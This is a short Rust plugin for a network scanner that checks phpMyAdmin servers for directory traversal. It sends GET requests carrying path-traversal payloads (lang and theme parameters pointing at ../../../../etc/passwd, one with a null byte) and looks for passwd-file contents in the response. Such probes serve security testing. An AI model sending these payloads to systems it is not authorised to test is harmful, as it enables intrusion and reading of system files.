/* http-phpmyadmin-dir-traversal - phpMyAdmin path traversal probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/phpmyadmin/index.php?lang=../../../../etc/passwd",
        "/phpmyadmin/index.php?lang=../../../../etc/passwd%00",
        "/phpmyadmin/index.php?theme=../../../../etc/passwd",
        "/phpMyAdmin/index.php?lang=../../../../etc/passwd",
        "/phpmyadmin/scripts/setup.php",
    ];
    if !valid(ctx) { return 1; }
    for path in paths.iter() {
        let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let body = http_body(&resp);
        if body.contains("root:x:") || body.contains("root:*:") || body.contains("daemon:x:") {
            set_out(ctx, &format!("VULNERABLE: phpMyAdmin directory traversal at {}", path));
            return 0;
        }
        if body.contains("phpMyAdmin") && http_status(&resp) == 200 {
            set_out(ctx, "phpMyAdmin detected; traversal not confirmed");
            return 0;
        }
    }
    set_out(ctx, "not vulnerable: phpMyAdmin directory traversal not confirmed");
    0
}
